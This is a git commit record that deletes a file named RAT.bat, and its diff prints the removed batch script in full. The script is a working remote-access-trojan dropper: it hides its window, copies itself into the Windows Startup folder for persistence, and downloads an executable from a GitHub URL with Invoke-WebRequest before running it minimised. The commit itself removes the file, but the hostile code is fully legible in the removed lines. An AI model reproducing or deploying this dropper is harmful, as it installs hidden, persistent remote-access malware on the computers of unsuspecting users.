9fece368b89ffe3a3e342875633de37ffc4674ef
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-29 22:38:39 +0300

    Delete RAT.bat

--- RAT.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-powershell.exe -windowstyle Hidden -command
-title %random%
-copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-cd %temp%
-if exist "YourProgram.exe" del YourProgram.exe
-powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/YourProgram.exe -OutFile "YourProgram.exe"
-start /min YourProgram.exe
-exit
